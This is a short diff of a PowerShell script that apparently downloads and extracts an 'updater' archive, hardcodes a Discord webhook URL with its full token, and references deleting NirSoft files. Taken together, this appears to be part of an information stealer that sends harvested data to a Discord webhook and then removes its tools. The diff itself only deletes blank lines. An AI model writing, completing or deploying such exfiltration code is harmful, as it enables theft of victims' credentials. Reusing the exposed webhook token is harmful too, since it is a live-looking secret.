@@ -1,4 +1,3 @@
-
 function Get {
   mkdir \temp 
   cd \temp
@@ -8,11 +7,9 @@ function Get {
   .\7z\7za.exe e updater.zip
 }
 
-
 function Discord {
 $DiscordUrl = 'https://discord.com/api/webhooks/1206120501471223828/xQpZHvLb0aphdEIsp5QuPnZpbN5WCbH5ZlQqz-UuwyKQxltZb3y3pmDBJkd7jFXbrMU2'
 }
-
 
 function Del-Nirsoft-File {
   cd C:\
